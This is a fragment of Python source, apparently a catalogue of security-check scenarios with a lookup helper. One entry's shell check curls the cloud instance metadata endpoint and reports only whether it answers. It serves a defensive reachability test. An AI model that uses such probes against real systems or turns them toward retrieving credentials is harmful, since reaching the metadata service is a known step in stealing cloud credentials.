        "INFO", triage_ref="",
        detect_sh='code=$(curl -s --max-time 2 -o /dev/null -w "%{http_code}" http://169.254.169.254/latest/meta-data/ 2>/dev/null); echo "IMDS -> ${code:-unreachable}"; [ "$code" = 200 ]'),
]

BY_ID = {s.id: s for s in SCENARIOS}


def get(scenario_id: str):
    return BY_ID.get(scenario_id.upper())
